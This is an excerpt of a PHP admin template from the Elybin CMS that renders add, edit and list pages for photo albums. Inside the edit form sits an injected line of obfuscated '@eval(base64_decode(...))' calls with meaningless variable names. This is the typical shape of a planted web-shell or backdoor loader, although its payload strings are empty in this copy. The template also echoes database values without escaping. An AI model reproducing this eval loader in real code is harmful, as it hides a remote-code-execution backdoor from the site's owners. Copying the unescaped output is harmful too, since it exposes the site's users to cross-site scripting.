...
?>
		<div class="page-header">
			<h1><span class="text-light-gray"><?php echo $lg_media?> / <?php echo $lg_album?> / </span><?php echo $lg_addnew?></h1>
		</div> <!-- / .page-header -->
		<!-- Content here -->
		<div class="row">
			<div class="col-sm-12">
				<form class="panel form-horizontal" action="<?php echo $action; ?>" method="post" id="form">
					<div class="panel-heading" id="tooltip">
						<span class="panel-title"><i class="fa fa-book"></i>&nbsp;&nbsp;<?php echo $lg_addnewalbum?></span>
					...
					<div class="panel-body">
					  ...
					  <div class="form-group">
					      ...
					      <div class="col-sm-4">
					      	<input type="text" name="name" class="form-control" placeholder="<?php echo $lg_title?>"/>
					      </div>
					  </div> <!-- / .form-group -->
					  <div class="form-group">
...
<?php
		...
		$tb 	= new ElybinTable('elybin_album');
		$coalbum = $tb->GetRow('album_id', $id);
		if(empty($id) OR ($coalbum == 0)){
		...
		// get data
		$calbum	= $tb->SelectWhere('album_id',$id,'','');
		$calbum	= $calbum->current();
?>
		<div class="page-header">
			<h1><span class="text-light-gray"><?php echo $lg_media?> / <?php echo $lg_album?> / </span><?php echo $lg_editalbum?></h1>
		</div> <!-- / .page-header -->
		<!-- Content here -->
		<div class="row">
			<div class="col-sm-12">
				<form class="panel form-horizontal" action="<?php echo $action; ?>" method="post" id="form">
					<div class="panel-heading" id="tooltip">
						<span class="panel-title"><i class="fa fa-book"></i>&nbsp;&nbsp;<?php echo $lg_editcurrentalbum?></span>
						<a class="btn btn-default btn-xs pull-right" data-toggle="modal" data-target="#help" data-placement="bottom" data-original-title="<?php echo $lg_help?>"><i class="fa fa-question-circle"></i></a>
					</div>
					<div class="panel-body">
					  <?php @eval(base64_decode(""));@eval($llllllllllllllllllllllllllllllllllllllllllllll($lllllllllllllllllllllllllllllllllllllllllllllll(""))); ?>
					  <div class="form-group">
					      <label class="col-sm-2 control-label"><?php echo $lg_title?></label>
					      <div class="col-sm-4">
					      	<input type="text" name="name" class="form-control" placeholder="<?php echo $lg_title?>" value="<?php echo $calbum->name?>"/>
					      </div>
					  </div> <!-- / .form-group -->
					  <div class="form-group">
					      <label class="col-sm-2 control-label"><?php echo $lg_date?></label>
					      <div class="col-sm-4">
					      	<div class="input-group date" id="date-pick">
					      		...
					      		?>
						      	<input type="text" name="date" class="form-control" placeholder="DD/MM/YYYY" id="date-input" value="<?php echo $date?>"/>
						      	<span class="input-group-addon">
									<i class="fa fa-calendar"></i>
								</span>
							</div>
					  ...
					  <div class="form-group">
					      ...
					      <div class="col-sm-10">
					      	<input type="checkbox" name="status" class="form-control" id="switcher-style" <?php if($calbum->status=='active'){echo 'checked="checked"';}?>>
...
<?php
		...
		default:
		$tb 	= new ElybinTable('elybin_album');
		$lalbum	= $tb->Select('album_id','DESC');
		$no = 1;
?>
		<!-- Page Header -->
		<div class="page-header">
			<div class="row">
				<h1 class="col-xs-12 col-sm-6 col-md-6 text-center text-left-sm">
					<span class="hidden-sm hidden-md hidden-lg"><i class="fa fa-book"></i>&nbsp;&nbsp;<?php echo $lg_album?></span>
					<span class="hidden-xs"><span class="text-light-gray"><?php echo $lg_album?> / </span><?php echo $lg_all?></span>
				</h1>
			...
			<div class="col-sm-12">
				<form action="<?php echo $action?>" method="post" class="panel">
					...
					<div class="panel-heading">
						<span class="panel-title"><i class="fa fa-book hidden-xs">&nbsp;&nbsp;</i><?php echo $lg_allalbum?></span>
					  ...
					  <div class="table-responsive">
						<table class="table table-hover" id="results">
						 <thead>
						    ...
						    <th><span class="fa fa-picture-o" id="tooltip-foto" data-placement="bottom" data-toggle="tooltip" data-original-title="<?php echo $lg_totalphoto?>"></span></th>
						    <th><?php echo $lg_status?></th>
						    <th><?php echo $lg_action?></th>
						</thead>
						<tbody>
						<?php
						foreach($lalbum as $alb){
							$tblgal = new ElybinTable('elybin_gallery');
							$banyak_foto = 0;
							$banyak_foto = $tblgal->GetRow('album_id',$alb->album_id);
						?>
						<tr>
						    <td><?php echo $no?></td>
						    <td><label class="px-single"><input type="checkbox" class="px" name="del[]" value="<?php echo $alb->album_id?>|<?php echo $alb->name?>"><span class="lbl"></span></label></td>
						    <td><?php echo $alb->name?></td>
						    <td><?php echo $alb->seotitle?></td>
						    <td><?php echo $banyak_foto?></td>
						    <td><?php echo $alb->status?></td>
						    <td>
						    	<div id="tooltip">
						    		<a href="?mod=album&amp;act=edit&amp;id=<?php echo $alb->album_id?>" class="btn btn-success btn-outline btn-sm" data-placement="bottom" data-toggle="tooltip" data-original-title="<?php echo $lg_edit?>"><i class="fa fa-pencil-square-o"></i></a>
						    		<a href="?mod=album&amp;act=del&amp;id=<?php echo $alb->album_id?>&amp;clear=yes" class="btn btn-danger btn-outline btn-sm<?php if($banyak_foto > 0){ echo ' disabled'; } ?>" data-toggle="modal" data-target="#delete"  data-placement="bottom" data-original-title="<?php echo $lg_delete?>"><i class="fa fa-times"></i></a>
						    	</div>
						    </td>
						</tr>
						<?php
